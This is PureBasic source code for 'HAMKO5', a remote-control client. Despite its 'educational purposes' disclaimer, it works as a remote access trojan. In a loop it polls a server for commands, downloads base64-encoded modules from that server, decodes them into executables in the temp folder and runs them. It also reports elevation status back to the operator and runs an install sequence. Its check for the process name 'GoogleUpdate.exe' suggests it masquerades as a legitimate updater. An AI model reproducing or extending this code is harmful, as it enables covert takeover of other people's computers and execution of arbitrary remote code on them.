; ******************************************************************************
; * Project: HAMKO5 (refactor 2)
; * 2011-2015 (c) anelehto
; *
; * This project is intended for personal use and educational purposes.
; * The author is not responsible for illegal use of this code.
; ******************************************************************************

; delay between connection attempts (in ms)
; lower values result in minor increase in server/client load but the connection is more responsive

Global interval.i = 333
Global verbose.b = 0

Global Date$ = FormatDate("%yyyy/%mm/%dd", Date())
Global Time$ = FormatDate("%hh:%ii:%ss", Date())

IncludePath "./include"

XIncludeFile("common.pbi")
XIncludeFile("elevation.pbi")

; decodes a base64 encoded executable
Procedure Base64_Decode(file.s)
	handle = ReadFile(#PB_Any, file)
	If handle
		Size = Lof(handle)
		*FileData = AllocateMemory(Size)
		If *FileData
			If ReadData(handle, *FileData, Size) = Size
				*Decoded = AllocateMemory(Size)
				If *Decoded      
					Bytes = Base64Decoder(*FileData, Size, *Decoded, Size)
					handle2 = CreateFile(#PB_Any,GetPathPart(file)+RemoveString(GetFilePart(file),GetExtensionPart(file))+"exe")
						If handle2
							WriteData(handle2, *Decoded, Bytes)
							CloseFile(handle2)
						EndIf
					FreeMemory(*Decoded)
				EndIf
			EndIf
		FreeMemory(*FileData)
		EndIf
		CloseFile(handle)
	EndIf
EndProcedure

; used to optimize network connections by auto-adjusting interval value based on connection latency
; disabled for now (needs more testing)
Procedure optimize(latency)
	Repeat
		If Date() - timer = 0 And timeout<950
			send_fdb("<span style='color:#FFCC00'>Connection seems unstable, increasing latency...</span>")
			interval+50
			send_fdb("<i>Latency set to "+Str(timeout)+" ms</i>")
		EndIf 
    
		If Date() - timer > 20 And timeout>350
			interval-50
			send_fdb("<i>Latency decreased to "+Str(timeout)+" ms</i>")
			timer = Date()-1
		EndIf 
    
		Delay(1000)
	ForEver 
EndProcedure

Global session = 0
Global cache = 1

; responsible for executing commands on localhost
Procedure execute(command.s)
	command = ReplaceString(command,">","#")
  
	module.s = StringField(command,1,"#")
	parameters.s = Chr(34)+ProgramFilename()+Chr(34)+Chr(34)+"#"+RemoveString(command,module+"#")+Chr(34)
	
	Select module
		Case "interval"
			If Trim(StringField(command,2,"#")) = ""
				interval2  = -1
			Else
				interval2 = Val(StringField(command,2,"#"))
			EndIf 
			
			If interval2 > 0 And interval2 < 10000 
				send_fdb("<span style='color:brown'><b>#core > </b></span>Setting interval to "+Str(interval2)+" ms")
				interval = interval2
			ElseIf interval2 = -1
				send_fdb("<span style='color:brown'><b>#core > </b></span>Interval is currently set at "+Str(interval)+" ms")
			Else
				send_fdb("<span style='color:brown'><b>#core > </b></span>Invalid interval value!")
			EndIf 
			ProcedureReturn
			
		Case "ping"
			start = ElapsedMilliseconds()
			POST_("api.php","action=echo&data=test")
			ping = ElapsedMilliseconds() - start
			send_fdb("<span style='color:brown'><b>#core > </b></span>Average time of a POST (4 bytes): <b>"+Str(ping)+ " ms </b>")
			ProcedureReturn
		Case "clear"
			POST_("api.php","action=cls&host="+hostname)
			Delay(100)
			send_fdb("<i>Stream cleared, continuing session ["+Date$+" - "+Time$+" LOCAL]</i>")
			ProcedureReturn
			
		Case "cache"
			If StringField(command,2,"#") <> ""
				cache = Val(StringField(command,2,"#"))
			EndIf 
			
			If cache 
				send_fdb("<span style='color:brown'><b>#core > </b></span>Cache is enabled")
			Else
				send_fdb("<span style='color:brown'><b>#core > </b></span>Cache is disabled")
			EndIf 
			ProcedureReturn		
			
		Case "help","?"
			outbuffer.s = "<span style='color:brown'><b>#core ></b></span>The following modules are currently supported:<br>"
			modules.s = Mid(POST_("api.php","action=mdl&host="+hostname),2)
			
			For i = 1 To CountString(modules,";")
				outbuffer +"%26nbsp%3B%26nbsp%3B"+ RemoveString(StringField(modules,i,";")+"<br>",".enc")
			Next i 
			
			outbuffer + "<br> For more info type the <u>name</u> of the module <b> > ?</b>"
			outbuffer + "<br> Additionally <b>interval</b>,<b>ping</b>,<b>clear</b>,<b>cache</b>,<b>endsession/F</b> are managed by core"
			send_fdb(outbuffer)
			
			ProcedureReturn	
			
		Case "endsession"
			If session = 2
				send_fdb("<span style='color:green'><b>#core > </b>Ending session from <b>"+GetFilePart(ProgramFilename())+"</b>...</span>")
				End
			Else
				send_fdb("<span style='color:red'><b>#core > </b>This session is elevated and cannot be terminated! Use <b> endsessionF </b> instead</span>")
			EndIf 
			ProcedureReturn
			
		Case "endsessionF"
				send_fdb("<span style='color:red'><b>#core > </b>Shutting-down elevated session ...</span>")
				End
			ProcedureReturn
				
			
	EndSelect
	
	If cache
		If FileSize(GetTemporaryDirectory()+module+".enc") > 0
			sha1.s=Mid(POST_("api.php","action=sha&name="+module+"&host="+hostname),2)
			sha1 = Left(sha1,Len(sha1)-1)
			If sha1 = SHA1FileFingerprint(GetTemporaryDirectory()+module+".enc")
				Goto run
			EndIf 	
		EndIf 
	EndIf 

	status.l = GET_FILE(svr_protocol+svr_address+svr_path+"modules/"+module+".enc?"+Str(Date()), GetTemporaryDirectory()+module+".enc") 
	
  	If status <> 0 
    	send_fdb("<span style='color:red'><b>#core > </b>Unknown command: <b>"+module+"</b></span>")
    	ProcedureReturn -1
  	EndIf 
  	
	CRC32.s = Hex(CRC32FileFingerprint( GetTemporaryDirectory()+module+".enc"))
	If CRC32 <> "0"
		Base64_Decode(GetTemporaryDirectory()+module+".enc")
		;If Not cache
		;	DeleteFile(GetTemporaryDirectory()+module+".enc")
		;EndIf 
		run:
		status.l=ShellExecute_(#Null, #Null, GetTemporaryDirectory()+module+".exe", parameters, #Null, #SW_SHOWNORMAL)

		If status = 42
			If verbose = 1
				send_fdb("<span style='color:green'>Module launched successfully <b>["+Str(status)+" / SIG: "+CRC32+"]</b></span>")
			EndIf 
			ProcedureReturn 1
		Else
			send_fdb("<span style='color:red'>Generic error <b>["+Str(status)+" / SIG: "+CRC32+"]</span></b>")
		EndIf 
	Else
		send_fdb("<span style='color:red'>CRC32 check failed... aborting execution</span>")
	EndIf 
ProcedureReturn 0
EndProcedure

Procedure Main()
send_com("NOP")

elstatus.s =""
If Not IsUserAdmin()
	elstatus+"<span style='color:red'><b>NOT ELEVATED</b></span>"
Else
	elstatus+"<span style='color:green'><b>ELEVATED</b></span>"
EndIf 

;If session <> 2 
	send_fdb("<i>New session started! ["+Date$+" - "+Time$+" LOCAL] - "+elstatus+"</i>")
;Else
	;send_fdb("<i>Session is online! ["+Date$+" - "+Time$+" LOCAL] - "+elstatus+"</i>")
;EndIf 

Repeat 
	Delay(interval)
	com.s = Trim(GET_(compath))
	If com And com <> "NOP"
		If com <> "ALV"
			execute(com)
		EndIf 
		send_com("NOP")
	EndIf 
	send_alv("NOP")
ForEver 
EndProcedure

Procedure GetLock(time)
	DeleteFile(GetTemporaryDirectory()+"core.lock")
	Repeat
		If FileSize(GetTemporaryDirectory()+"core.lock") >= 0
			send_fdb("<span style='color:green'>Installation completed, closing link and restarting session...</span>")
			End
		EndIf 
		Delay(time)
	ForEver 
EndProcedure

arg.s = ProgramParameter(0)

If arg = Space(0)
	
	CompilerIf #PB_Compiler_Debugger 
		
		send_fdb("<span style='color:orange'><b>Running in DEBUG mode, installation modules are not invoked</b></span><br>")

	CompilerElse
		
 		If GetFilePart(ProgramFilename()) <> "GoogleUpdate.exe"; And GetFilePart(ProgramFilename()) <> "hamko5.exe"
  
    		send_fdb("<span><b>Invoking installation sequence from [ "+ProgramFilename()+" ] </b></span>")
    		If Execute("install") = 1
    			send_fdb("<span style='color:orange'><b>NOTICE: This session will remain active until we get an elevated instance</b></span>")
				;send_fdb("<span style='color:grey'>Close it manually after UAC confirmation via <b>endsession</b></span>")
				session = 2
      			;Delay(500)
      			;send_fdb("<span style='color:green'>Closing link and restarting session in 3 seconds</span>")
      			;End 
      			CreateThread(@GetLock(),100)
    		Else
      			send_fdb("<span style='color:red'>Something went wrong, fallback mode enabled</span>")
      			send_fdb("<b> <i> Failed to install, link will be lost upon remote system reboot</i></b>")
      		EndIf 
      	Else
      		;elevate()
      		If Not CreateFile(0, GetTemporaryDirectory()+"core.lock")
      			send_fdb("<span style='color:red'>"+GetFilePart(ProgramFilename())+" was unable to get lock, shutting down...</span>")
      			End 
      		EndIf 
      		
 		EndIf 
  
 	CompilerEndIf
 	
Else
	
  	Select arg
    	Case "FDB" 
    		send_fdb("<span style='color:#A0A0A0'><b>#"+ProgramParameter(2)+" > </b></span>"+ProgramParameter(1)+"")
    		 End 
    	Case "COM"
    		send_com(ProgramParameter())
    		 End 
    	Case "UPL"
     		;send_file(ProgramParameter())
     EndSelect
	    
EndIf 

; main loop

Main()

; IDE Options = PureBasic 5.00 (Windows - x86)
; EnableUnicode
; Executable = ..\..\Users\admin\Desktop\hamko5.exe
; EnablePurifier
; EnableCompileCount = 515
; EnableBuildCount = 108